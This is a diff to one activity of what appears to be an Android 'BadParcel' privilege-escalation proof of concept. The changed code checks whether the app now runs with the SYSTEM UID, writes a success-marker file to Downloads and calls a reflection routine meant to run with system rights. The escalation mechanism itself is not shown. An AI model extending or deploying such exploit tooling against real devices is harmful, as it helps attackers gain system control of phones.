@@ -17,39 +17,43 @@ public class ProofActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // 自身のプロセスUIDを取得（システムから起動されていれば 1000）
         int myUid = Process.myUid();
+        int callerUid = getCallingUid(); // 起動元のUID
 
-        String msg = "[+] ProofActivity started. My UID=" + myUid;
+        String msg = "[+] ProofActivity started. My UID=" + myUid + ", Caller UID=" + callerUid;
         Log.i(TAG, msg);
         MainActivity.appendLog(msg);
 
-        // 自分のUIDがシステム（1000）なら提権成功
         if (myUid == 1000) {
             MainActivity.appendLog("[!!!] SUCCESS: Process running with SYSTEM UID (1000) !!!");
-            // 証跡ファイルを作成
-            try {
-                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-                if (!dir.exists()) dir.mkdirs();
-                File proof = new File(dir, "uid_proof.txt");
-                try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
-                    pw.println("Process UID: " + myUid);
-                    pw.println("Timestamp: " + new java.util.Date());
-                    pw.println("BadParcel exploit succeeded!");
-                }
-                MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
-            } catch (Exception e) {
-                MainActivity.appendLog("[-] Failed to create proof file: " + e.getMessage());
-            }
-
-            // システム権限で SecureUI リフレクションを試行
+            createProofFile("system");
             attemptSecureUIReflection();
+        } else if (callerUid == 1000) {
+            // 起動元がシステムだが、自分はシステムでない場合（通常起こらない）
+            MainActivity.appendLog("[!] Called by system but not running as system (myUid=" + myUid + ")");
+            createProofFile("caller_system");
         } else {
             MainActivity.appendLog("[!] UID=" + myUid + " (not system). Exploit may have failed.");
         }
 
-        // 終了
         finish();
+    }
+
+    private void createProofFile(String type) {
+        try {
+            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+            if (!dir.exists()) dir.mkdirs();
+            File proof = new File(dir, "uid_proof_" + type + ".txt");
+            try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
+                pw.println("Process UID: " + Process.myUid());
+                pw.println("Caller UID: " + getCallingUid());
+                pw.println("Timestamp: " + new java.util.Date());
+                pw.println("BadParcel exploit " + (type.equals("system") ? "succeeded!" : "partial"));
+            }
+            MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
+        } catch (Exception e) {
+            MainActivity.appendLog("[-] Failed to create proof file: " + e.getMessage());
+        }
     }
 
     private void attemptSecureUIReflection() {
